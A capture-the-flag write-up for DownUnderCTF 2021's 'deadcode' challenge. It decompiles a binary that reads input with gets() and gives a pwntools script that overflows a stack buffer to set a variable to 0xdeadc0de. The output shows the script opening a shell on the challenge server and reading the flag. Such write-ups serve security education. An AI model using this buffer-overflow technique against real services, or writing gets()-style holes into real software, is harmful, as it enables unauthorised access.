# DownUnderCTF 2021

## deadcode

> 100
> 
> I'm developing this new application in C, I've setup some code for the new features but it's not (a)live yet.
> 
> Author: xXl33t_h@x0rXx
>
> `nc pwn-2021.duc.tf 31916`
>
> [`deadcode`](deadcode)

Tags: _pwn_ _x86-64_ _bof_ _remote-shell_ _variable-overwrite_


## Summary

Baby BOF.  Overwrite variable.


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Partial RELRO = GOT overwrite; No PIE = Easy ROP; No canary = Easy BOF.

None of this matters for this challenge.


### Decompile with Ghidra   

```c
undefined8 main(void)
{
  char local_28 [24];
  long local_10;
  
  local_10 = 0;
  buffer_init();
  puts("\nI\'m developing this new application in C, I\'ve setup some code for the new features but it\'s not (a)live yet.");
  puts("\nWhat features would you like to see in my app?");
  gets(local_28);
  if (local_10 == 0xdeadc0de) {
    puts("\n\nMaybe this code isn\'t so dead...");
    system("/bin/sh");
  }
  return 0;
}
```

`gets` is the vuln.  To get a shell just set `local_10` to `0xdeadc0de`.  Ghidra makes this easy for you.  `local_28` is `0x28` bytes from the return address on the stack.  `local_10`, is, you guessed it, `0x10` bytes from the return address on the stack.  So to overwrite `local_10`, send `0x28 - 0x10` bytes of garbage followed by `0xdeadcode` (as `long`).


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./deadcode')

if args.REMOTE:
    p = remote('pwn-2021.duc.tf', 31916)
else:
    p = process(binary.path)

payload  = b''
payload += (0x28 - 0x10) * b'A'
payload += p64(0xdeadc0de)

p.sendlineafter(b'?\n',payload)
p.interactive()
```

Output:

```bash
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/downunderctf2021/deadcode/deadcode'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to pwn-2021.duc.tf on port 31916: Done
[*] Switching to interactive mode


Maybe this code isn't so dead...
$ cat flag.txt
DUCTF{y0u_br0ught_m3_b4ck_t0_l1f3_mn423kcv}
```
